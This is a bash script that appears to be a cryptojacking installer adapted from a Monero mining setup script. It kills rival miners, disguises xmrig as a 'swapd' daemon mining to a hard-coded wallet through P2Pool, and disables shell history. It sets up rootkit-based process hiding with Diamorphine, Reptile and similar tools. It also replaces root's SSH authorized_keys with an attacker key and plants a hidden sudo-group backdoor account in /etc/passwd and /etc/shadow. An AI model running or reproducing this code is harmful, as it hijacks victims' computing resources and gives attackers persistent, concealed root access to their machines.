#!/bin/bash

unset HISTFILE
export HISTFILE=/dev/null
#unset HISTFILE ;history -d $((HISTCMD-1))
#export HISTFILE=/dev/null ;history -d $((HISTCMD-1))

#crontab -r

systemctl stop gdm2
systemctl disable gdm2 --now

systemctl stop swapd
systemctl disable swapd --now

#killall swapd
kill -9 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')

#killall kswapd0
kill -9 $(/bin/ps ax -fu $USER | grep "kswapd0" | grep -v "grep" | awk '{print $2}')

chattr -i .swapd/
chattr -i .swapd/*
chattr -i .swapd.swapd
rm -rf .swapd/

chattr -i .gdm
chattr -i .gdm/*
chattr -i .gdm/.swapd
rm -rf .gdm/

chattr -i .gdm2_manual
chattr -i .gdm2_manual/*
chattr -i .gdm2_manual/.swapd
rm -rf .gdm2_manual

chattr -i .gdm2_manual_\*/
chattr -i .gdm2_manual_\*/*
chattr -i .gdm2_manual_\*/.swapd
rm -rf .gdm2_manual_\*/

chattr -i /etc/systemd/system/swapd.service
rm -rf /etc/systemd/system/swapd.service

chattr -i .gdm2/*
chattr -i .gdm2/
chattr -i .gdm2/.swapd
rm -rf .gdm2/

chattr -i /etc/systemd/system/gdm2.service
rm -rf /etc/systemd/system/gdm2.service

cd /tmp
cd .ICE-unix
cd .X11-unix
chattr -i Reptile/*
chattr -i Reptile/
chattr -i Reptile/.swapd
rm -rf Reptile

cd /tmp
cd .ICE-unix
cd .X11-unix
chattr -i Nuk3Gh0st/*
chattr -i Nuk3Gh0st/
chattr -i Nuk3Gh0st/.swapd
rm -rf Nuk3Gh0st

#chattr -i $HOME/.gdm2/
#chattr -i $HOME/.gdm2/config.json
#chattr -i $HOME/.swapd/
#chattr -i $HOME/.swapd/.swapd
#chattr -i $HOME/.swapd/config.json

apt install curl -y

VERSION=2.11

# printing greetings

echo "MoneroOcean mining setup script v$VERSION."
echo "(please report issues to support@moneroocean.stream email with full output of this script with extra \"-x\" \"bash\" option)"

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1
EMAIL=$2 # this one is optional

#echo "[*] #executing #BotKiller..."
#curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/MinerKiller.sh | bash
#curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kill-miner.sh | bash
#curl  -s -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/minerkill.sh | bash

echo "[*] #checking prerequisites..."

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_swapd_processhider.sh <wallet address> [<your email address>]"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=$(echo $WALLET | cut -f1 -d".")
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

#if ! sudo -n true 2>/dev/null; then
#  if ! pidof systemd >/dev/null; then
#    echo "ERROR: This script requires systemd to work correctly"
#    exit 1
#  fi
#fi

echo "[*] #calculating port..."

CPU_THREADS=$(nproc)
EXP_MONERO_HASHRATE=$((CPU_THREADS * 700 / 1000))
if [ -z $EXP_MONERO_HASHRATE ]; then
  echo "ERROR: Can't compute projected Monero CN hashrate"
  exit 1
fi

power2() {
  if ! type bc >/dev/null; then
    if [ "$1" -gt "8192" ]; then
      echo "8192"
    elif [ "$1" -gt "4096" ]; then
      echo "4096"
    elif [ "$1" -gt "2048" ]; then
      echo "2048"
    elif [ "$1" -gt "1024" ]; then
      echo "1024"
    elif [ "$1" -gt "512" ]; then
      echo "512"
    elif [ "$1" -gt "256" ]; then
      echo "256"
    elif [ "$1" -gt "128" ]; then
      echo "128"
    elif [ "$1" -gt "64" ]; then
      echo "64"
    elif [ "$1" -gt "32" ]; then
      echo "32"
    elif [ "$1" -gt "16" ]; then
      echo "16"
    elif [ "$1" -gt "8" ]; then
      echo "8"
    elif [ "$1" -gt "4" ]; then
      echo "4"
    elif [ "$1" -gt "2" ]; then
      echo "2"
    else
      echo "1"
    fi
  else
    echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
  fi
}

#PORT=$(( $EXP_MONERO_HASHRATE * 30 ))
#PORT=$(( $PORT == 0 ? 1 : $PORT ))
#PORT=`power2 $PORT`
#PORT=$(( 10000 + $PORT ))
#if [ -z $PORT ]; then
#  echo "ERROR: Can't compute port"
#  exit 1
#fi

#if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
#  echo "ERROR: Wrong computed port value: $PORT"
#  exit 1
#fi

echo "[*] #printing intentions..."

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/.swapd/swapd.sh script."
echo "Mining will happen to $WALLET wallet."
if [ ! -z $EMAIL ]; then
  echo "(and $EMAIL email as password to modify wallet options later at https://moneroocean.stream site)"
fi
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using moneroocean_miner systemd service."
fi

echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 3
echo
echo

echo "[*] #start doing stuff: preparing miner..."

echo "[*] Removing previous moneroocean miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop moneroocean_miner.service
  sudo systemctl stop gdm2.service
fi
killall -9 xmrig
killall -9 kswapd0

echo "[*] Removing previous directories..."
rm -rf $HOME/moneroocean
rm -rf $HOME/.moneroocean
rm -rf $HOME/.gdm2*
#rm -rf $HOME/.swapd

echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
#  exit 1
fi

wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz
# curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o $HOME/.swapd/xmrig.tar.gz

echo "[*] Unpacking xmrig.tar.gz to $HOME/.swapd/"
[ -d $HOME/.swapd/ ] || mkdir $HOME/.swapd/
if ! tar xzfv /tmp/xmrig.tar.gz -C $HOME/.swapd/; then
  echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.swapd/ directory"
#  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
$HOME/.swapd/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/.swapd/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/.swapd/xmrig is not functional"
  else
    echo "WARNING: Advanced version of $HOME/.swapd/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=$(curl -s https://github.com/xmrig/xmrig/releases/latest | grep -o '".*"' | sed 's/"//g')
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"$(curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" | cut -d \" -f2)

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
 #   exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.swapd/"
  if ! tar xzfv /tmp/xmrig.tar.gz -C $HOME/.swapd --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/.swapd/ directory"
  fi
  rm /tmp/xmrig.tar.gz

  rm -rf $HOME/.swapd/config.json
  wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json -O $HOME/.swapd/config.json
  curl https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json

  echo "[*] Checking if stock version of $HOME/.swapd/xmrig works fine (and not removed by antivirus software)"
  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
  $HOME/.swapd/xmrig --help >/dev/null
  if (test $? -ne 0); then
    if [ -f $HOME/.swapd/xmrig ]; then
      echo "ERROR: Stock version of $HOME/.swapd/xmrig is not functional too"
    else
      echo "ERROR: Stock version of $HOME/.swapd/xmrig was removed by antivirus too"
    fi
    #    exit 1
  fi
fi

echo "[*] Miner $HOME/.swapd/xmrig is OK"

echo "mv $HOME/.swapd/xmrig $HOME/.swapd/swapd"
mv $HOME/.swapd/xmrig $HOME/.swapd/swapd

# ======== XMRIG CONFIGURATION ========
echo "[*] Reconfiguring XMRig for P2Pool..."
sed -i 's/"url": *"[^"]*",/"url": "127.0.0.1:3333",/' $HOME/.swapd/config.json
sed -i 's/"user": *"[^"]*",/"user": "437YnP2yNsLYAiU9LTm1fuf8owjaMojbMPzMykkrF4Hi21yU7bSa5u4c4pdhx9HZBMTNEUq9YpqBkGghm1dcaYjYHs1bd5q",/' $HOME/.swapd/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "x",/' $HOME/.swapd/config.json
sed -i 's/"algo": *[^,]*,/"algo": "rx\/0",/' $HOME/.swapd/config.json
#sed -i 's/"user": *"[^"]*",/"user": "437YnP2yNsLYAiU9LTm1fuf8owjaMojbMPzMykkrF4Hi21yU7bSa5u4c4pdhx9HZBMTNEUq9YpqBkGghm1dcaYjYHs1bd5q",/' $HOME/.swapd/config.json
#sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 75,/' $HOME/.swapd/config.json
#sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $HOME/.swapd/config.json
#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/.swapd/config.json
#sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $HOME/.swapd/config.json
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json
sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $HOME/.swapd/config.json

echo "[*] Copying xmrig-proxy config"

#mv $HOME/.swapd/config.json $HOME/.swapd/config_ORiG.json

#cd $HOME/.swapd/ ; touch config.json ; cat config.json <<EOL
#{
#    "autosave": true,
#    "cpu": true,
#    "opencl": true,
#    "cuda": true,
#    "pools": [
#        {
#            "url": "194.164.63.118:3333"
#        }
#    ]
#}
#EOL

cp $HOME/.swapd/config.json $HOME/.swapd/config_background.json
sed -i 's/"background": *false,/"background": true,/' $HOME/.swapd/config_background.json

#echo "[*] #preparing script..."

killall xmrig

echo "[*] Creating $HOME/.swapd/swapd.sh script"
cat >$HOME/.swapd/swapd.sh <<EOL
#!/bin/bash
if ! pidof swapd >/dev/null; then
  nice $HOME/.swapd/swapd \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall swapd\" or \"sudo killall swapd\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/.swapd/swapd.sh

echo "[*] #preparing script background work and work under reboot..."

if ! sudo -n true 2>/dev/null; then
  if ! grep .swapd/swapd.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/.swapd/swapd.sh script to $HOME/.profile"
    echo "$HOME/.swapd/swapd.sh --config=$HOME/.swapd/config.json >/dev/null 2>&1" >>$HOME/.profile
  else
    echo "Looks like $HOME/.swapd/swapd.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/.swapd/swapd.log file)"
  bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
else

  if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') > 3500000 ]]; then
    echo "[*] Enabling huge pages"
    echo "vm.nr_hugepages=$((1168 + $(nproc)))" | sudo tee -a /etc/sysctl.conf
    sudo sysctl -w vm.nr_hugepages=$((1168 + $(nproc)))
  fi

  if ! type systemctl >/dev/null; then

    echo "[*] Running miner in the background (see logs in $HOME/.swapd/swapd.log file)"
    bash $HOME/.swapd/swapd.sh --config=$HOME/.swapd/config_background.json >/dev/null 2>&1
    echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
    echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."

  else

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"
if [ "$CPU_THREADS" -lt "4" ]; then
  echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
  echo "sudo apt-get update; sudo apt-get install -y cpulimit"
  echo "sudo cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b"
  if [ "$(tail -n1 /etc/rc.local)" != "exit 0" ]; then
    echo "sudo sed -i -e '\$acpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
  else
    echo "sudo sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
  fi
else
  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config.json"
  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HOME/.swapd/config_background.json"
fi
echo ""

echo "[*] #Installing r00tkit(z)"
#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; apt-get update -y && apt-get install linux-headers-$(uname -r) git make gcc -y --force-yes ; rm -rf hiding-cryptominers-linux-rootkit/ ; git clone https://github.com/alfonmga/hiding-cryptominers-linux-rootkit ; cd hiding-cryptominers-linux-rootkit/ ; make ; dmesg ; insmod rootkit.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

echo "[*] Determining GPU+CPU (without lshw)"
cd /tmp
cd .ICE-unix
cd .X11-unix
yum install pciutils -y
apt-get install pciutils -y --force-yes
update-pciids
lspci -vs 00:01.0
nvidia-smi
aticonfig --odgc --odgt
nvtop
radeontop
echo "Possible CPU Threads:"
(nproc)
#cd $HOME/.swapd/ ; wget https://github.com/pwnfoo/xmrig-cuda-linux-binary/raw/main/libxmrig-cuda.so

echo "[*] Determining GPU+CPU"
cd /tmp
cd .ICE-unix
cd .X11-unix
yum install msr-tools pciutils lshw -y
apt-get install msr-tools pciutils lshw -y --force-yes
zypper install msrtools pciutils lshw -y
update-pciids
lspci -vs 00:01.0
lshw -C display
nvidia-smi
aticonfig --odgc --odgt
nvtop
radeontop
echo "Possible CPU Threads:"
(nproc)

#echo "[*] MO0RPHIUM!! Viiiiel M0RPHIUM!!! Brauchen se nur zu besorgen, fixen kann ich selber! =)"
#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; apt-get update -y ; apt-get install linux-headers-$(uname -r) git make gcc msr-tools -y --force-yes ;  git clone https://github.com/m0nad/Diamorphine ; cd Diamorphine/ ; make ; insmod diamorphine.ko ; dmesg -C ; kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

#echo "[*] Nuk3Gh0st..."
#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ;rm -rf Nuk3Gh0st ; rm -rf /usr/bin/nuk3gh0st/ ; zypper update ; zypper install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y ; zypper update -y; zypper install -y ncurses-devel ; git clone https://github.com/juanschallibaum/Nuk3Gh0st ; cd Nuk3Gh0st ; make ; make install ; load-nuk3gh0st ; nuk3gh0st --hide-pid=`/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

#echo "[*] Reptile..."
#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; rm -rf Diamorphine ; rm -rf Reptile ; rm -rf hiding-cryptominers-linux-rootkit ; apt-get update -y ; apt-get install build-essential linux-headers-$(uname -r) git make gcc msr-tools libncurses-dev -y --force-yes ; yum update -y; yum install -y ncurses-devel ; git clone https://github.com/f0rb1dd3n/Reptile/ && cd Reptile ; make defconfig ; make ; make install ; dmesg -C ; /reptile/reptile_cmd hide ;  kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`

apt install dwarves -y
cp /sys/kernel/btf/vmlinux /usr/lib/modules/$(uname -r)/build/

optimize_func() {
  MSR_FILE=/sys/module/msr/parameters/allow_writes

  if test -e "$MSR_FILE"; then
    echo on >$MSR_FILE
  else
    modprobe msr allow_writes=on
  fi

  if grep -E 'AMD Ryzen|AMD EPYC' /proc/cpuinfo >/dev/null; then
    if grep "cpu family[[:space:]]\{1,\}:[[:space:]]25" /proc/cpuinfo >/dev/null; then
      if grep "model[[:space:]]\{1,\}:[[:space:]]97" /proc/cpuinfo >/dev/null; then
        echo "Detected Zen4 CPU"
        wrmsr -a 0xc0011020 0x4400000000000
        wrmsr -a 0xc0011021 0x4000000000040
        wrmsr -a 0xc0011022 0x8680000401570000
        wrmsr -a 0xc001102b 0x2040cc10
        echo "MSR register values for Zen4 applied"
      else
        echo "Detected Zen3 CPU"
        wrmsr -a 0xc0011020 0x4480000000000
        wrmsr -a 0xc0011021 0x1c000200000040
        wrmsr -a 0xc0011022 0xc000000401500000
        wrmsr -a 0xc001102b 0x2000cc14
        echo "MSR register values for Zen3 applied"
      fi
    else
      echo "Detected Zen1/Zen2 CPU"
      wrmsr -a 0xc0011020 0
      wrmsr -a 0xc0011021 0x40
      wrmsr -a 0xc0011022 0x1510000
      wrmsr -a 0xc001102b 0x2000cc16
      echo "MSR register values for Zen1/Zen2 applied"
    fi
  elif grep "Intel" /proc/cpuinfo >/dev/null; then
    echo "Detected Intel CPU"
    wrmsr -a 0x1a4 0xf
    echo "MSR register values for Intel applied"
  else
    echo "No supported CPU detected"
  fi

  sysctl -w vm.nr_hugepages=$(nproc)

  for i in $(find /sys/devices/system/node/node* -maxdepth 0 -type d); do
    echo 3 >"$i/hugepages/hugepages-1048576kB/nr_hugepages"
  done

  echo "1GB pages successfully enabled"
}

if [ $(id -u) = 0 ]; then
  echo "Running as root"
  optimize_func
else
  echo "Not running as root"
  sysctl -w vm.nr_hugepages=$(nproc)
fi

# ======== XMRIG CONFIGURATION FOR P2POOL ========
echo "[*] Reconfiguring XMRig for P2Pool..."
sed -i 's/"url": *"[^"]*",/"url": "127.0.0.1:3333",/' $HOME/.swapd/config.json
sed -i 's/"user": *"[^"]*",/"user": "x",/' $HOME/.swapd/config.json
sed -i 's/"pass": *"[^"]*",/"pass": "x",/' $HOME/.swapd/config.json
sed -i 's/"algo": *[^,]*,/"algo": "rx\/0",/' $HOME/.swapd/config.json
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.swapd/config.json

# ======== P2POOL INSTALLATION ========
echo "[*] Installing P2Pool..."
# Clean previous installations
sudo systemctl stop p2pool 2>/dev/null
rm -rf ~/p2pool /root/.p2pool

# Download and install P2Pool
cd /tmp
wget https://github.com/SChernykh/p2pool/releases/download/v4.4/p2pool-v4.4-linux-x64.tar.gz
tar -xzf p2pool-v4.4-linux-x64.tar.gz -C $HOME/
mv "$HOME/p2pool-v4.4-linux-x64" "$HOME/p2pool"

# ======== P2POOL SERVICE CONFIGURATION ========
echo "[*] Creating P2Pool service..."
cat <<EOF | sudo tee /etc/systemd/system/p2pool.service
[Unit]
Description=P2Pool Node
After=network.target

[Service]
WorkingDirectory=/root/p2pool
ExecStart=/root/p2pool/p2pool \
  --host p2pmd.xmrvsbeast.com \
  --rpc-port 18081 \
  --rpc-ssl \
  --wallet 437YnP2yNsLYAiU9LTm1fuf8owjaMojbMPzMykkrF4Hi21yU7bSa5u4c4pdhx9HZBMTNEUq9YpqBkGghm1dcaYjYHs1bd5q \
  --stratum [::]:3333 \
  --p2p [::]:37889 \
  --loglevel 3 \
  --light-mode \
  --out-peers 35 \
  --in-peers 25 \
  --no-upnp
Restart=on-failure
RestartSec=30
User=root

[Install]
WantedBy=multi-user.target
EOF

# Set permissions
chmod +x $HOME/p2pool/p2pool
sudo chown -R $(whoami):$(id -gn) $HOME/p2pool

# ======== FIREWALL CONFIGURATION ========
echo "[*] Configuring firewall..."
sudo ufw allow 3333/tcp comment "P2Pool Stratum"
sudo ufw allow 37889/tcp comment "P2Pool P2P"
sudo ufw reload

# ======== MINER SERVICE DEPENDENCY ========
echo "[*] Creating swapd service..."
cat <<EOF | sudo tee /etc/systemd/system/swapd.service
[Unit]
Description=Swap Daemon Service

[Service]
ExecStart=$HOME/.swapd/swapd -o 127.0.0.1:3333 -u x+50000
Restart=always
Nice=10
CPUWeight=1

[Install]
WantedBy=multi-user.target
EOF

# ======== FINAL SETUP STEPS ========
echo "[*] Starting services..."
sudo systemctl daemon-reload
sudo systemctl enable --now p2pool
sudo systemctl enable --now swapd

echo "[*] Verification commands:"
echo "P2Pool status: sudo journalctl -u p2pool -f"
echo "Miner status: sudo journalctl -u swapd -f"
echo "Network ports: ss -tulpn | grep -E '3333|37889'"


echo "[*] hid1ng... ;)"

kill -31 $(pgrep -f -u root config.json)

kill -31 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}')
#kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;

kill -63 $(/bin/ps ax -fu $USER | grep "swapd" | grep -v "grep" | awk '{print $2}') :
#kill -63 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` ;

# echo "[*] Installing OpenCL (Intel, NVIDIA, AMD): https://support.zivid.com/en/latest/getting-started/software-installation/gpu/install-opencl-drivers-ubuntu.html or CUDA: https://linuxconfig.org/how-to-install-cuda-on-ubuntu-20-04-focal-fossa-linux"

rm -rf $HOME/xmrig*
rm -rf xmrig*
apt autoremove -y
yum autoremove -y

rm -rf xmrig* config.json*

#cat << 'EOF' > "$HOME/.swapd/check_swapd.sh"
#    #!/bin/bash
#
#    # Define the service name
#    SERVICE="swapd"
#
#    # Check if the service is running
#    if systemctl is-active --quiet $SERVICE
#    then
#        echo "$SERVICE is running."
#    else
#        echo "$SERVICE is not running. Attempting to restart..."
#        systemctl restart $SERVICE
#
#        # Check if the restart was successful
#        if systemctl is-active --quiet $SERVICE
#        then
#            echo "$SERVICE has been successfully restarted."
#        else
#            echo "Failed to restart $SERVICE."
#        fi
#    fi
#EOF

## Make the check script executable
#chmod +x "$HOME/.swapd/check_swapd.sh"

## Cron job setup: remove outdated lines and add the new command
#CRON_JOB="*/5 * * * * $HOME/.swapd/check_swapd.sh"
#(crontab -l 2>/dev/null | grep -v -E '(out dat|check_swapd.sh)'; echo "$CRON_JOB") | crontab -

echo "PASS..."
#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
#PASS=`hostname`
#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
PASS=$(sh -c "(curl -4 ip.sb)")
if [ "$PASS" == "localhost" ]; then
  PASS=$(ip route get 1 | awk '{print $NF;exit}')
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/.swapd/config.json

echo "[*] Generating ssh key on server"
#cd ~ && rm -rf .ssh && rm -rf ~/.ssh/authorized_keys && mkdir ~/.ssh && chmod 700 ~/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDPrkRNFGukhRN4gwM5yNZYc/ldflr+Gii/4gYIT8sDH23/zfU6R7f0XgslhqqXnbJTpHYms+Do/JMHeYjvcYy8NMYwhJgN1GahWj+PgY5yy+8Efv07pL6Bo/YgxXV1IOoRkya0Wq53S7Gb4+p3p2Pb6NGJUGCZ37TYReSHt0Ga0jvqVFNnjUyFxmDpq1CXqjSX8Hj1JF6tkpANLeBZ8ai7EiARXmIHFwL+zjCPdS7phyfhX+tWsiM9fm1DQIVdzkql5J980KCTNNChdt8r5ETre+Yl8mo0F/fw485I5SnYxo/i3tp0Q6R5L/psVRh3e/vcr2lk+TXCjk6rn5KJirZWZHlWK+kbHLItZ8P2AcADHeTPeqgEU56NtNSLq5k8uLz9amgiTBLThwIFW4wjnTkcyVzMHKoOp4pby17Ft+Edj8v0z1Xo/WxTUoMwmTaQ4Z5k6wpo2wrsrCzYQqd6p10wp2uLp8mK5eq0I2hYL1Dmf9jmJ6v6w915P2aMss+Vpp0=' >>~/.ssh/authorized_keys
### key: /Users/jamy/.ssh/id_rsa_NuH: (on 0nedr1v3!)
rm -rf /root/.ssh && rm -rf /root/.ssh/authorized_keys && mkdir /root/.ssh && chmod 700 /root/.ssh && echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9fybn6S/DbQQe/G8V0c9+VNjJEmoNxUrIGDqD+vSvS/2uAQ9HaumDAvVau2CcVBJM9STUm6xEGXdM/81LeJBVnw01D+FgFo5Sr/4zo+MDMUS/y/TfwK8wtdeuopvgET/HiZJn9/d68vbWXaS3jnQVTAI9EvpC1WTjYTYxFS/SyWJUQTA8tYF30jagmkBTzFjr/EKxxKTttdb79mmOgx1jP3E7bTjRPL9VxfhoYsuqbPk+FwOAsNZ1zv1UEjXMBvH+JnYbTG/Eoqs3WGhda9h3ziuNrzJGwcXuDhQI1B32XgPDxB8etsT6or8aqWGdRlgiYtkPCmrv+5pEUD8wS3WFhnOrm5Srew7beIl4LPLgbCPTOETgwB4gk/5U1ZzdlYmtiBNJxMeX38BsGoAhTDbFLcakkKP+FyXU/DsoAcow4av4OGTsJfs+sIeOWDQ+We5E4oc/olVNdSZ18RG5dwUde6bXbsrF5ipnE8oIBUI0z76fcbAOxogO/oxhvpuyWPOwXE6GaeOhWfWTxIyV5X4fuFDQXRPlMrlkWZ/cYb+l5JiT1h+vcpX3/dQC13IekE3cUsr08vicZIVOmCoQJy6vOjkj+XsA7pMYb3KgxXgQ+lbCBCtAwKxjGrfbRrlWoqweS/pyGxGrUVJZCf6rC6spEIs+aMy97+Q=='  >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys

##useradd -u 455 -G root,sudo -M -o -s /bin/bash -p '$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1' clamav-mail
##awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; middle = int(NR/2); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<NR; i++) print lines[i]}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd
### NOT NEEDED! ### sudo echo "clamav-mail:'$1$JSi1yOvo$RXt73G6AUw2EhNhvJn4Ei1'" | sudo chpasswd -e
PASSWORD_HASH='$1$GDwMqCqg$eDXKBHbUDpOgunTpref5J1' && if id -u clamav-mail > /dev/null 2>&1; then sudo userdel --remove clamav-mail; fi && if ! grep -q '^sudo:' /etc/group; then sudo groupadd sudo; fi && sudo useradd -u 455 -G root,sudo -M -o -s /bin/bash clamav-mail && sudo chpasswd -e <<< "clamav-mail:$PASSWORD_HASH" && awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/passwd > /tmp/passwd && sudo mv /tmp/passwd /etc/passwd && awk '{lines[NR] = $0} END {last_line = lines[NR]; delete lines[NR]; num_lines = NR - 1; middle = int(num_lines / 2 + 1); for (i=1; i<middle; i++) print lines[i]; print last_line; for (i=middle; i<=num_lines; i++) print lines[i];}' /etc/shadow > /tmp/shadow && sudo mv /tmp/shadow /etc/shadow
### (lala´s std)

echo "[*] make toolZ, Diamorphine"
cd /tmp
cd .ICE-unix
cd .X11-unix
rm -rf Diamorphine
rm -rf Reptile
yum install linux-generic linux-headers-$(uname -r) kernel kernel-devel kernel-firmware kernel-tools kernel-modules kernel-headers git make gcc msr-tools -y
apt-get update -y
NEEDRESTART_MODE=a apt-get reinstall kmod
NEEDRESTART_MODE=a apt-get install linux-generic linux-headers-$(uname -r) -y
NEEDRESTART_MODE=a apt-get install git make gcc msr-tools build-essential libncurses-dev -y
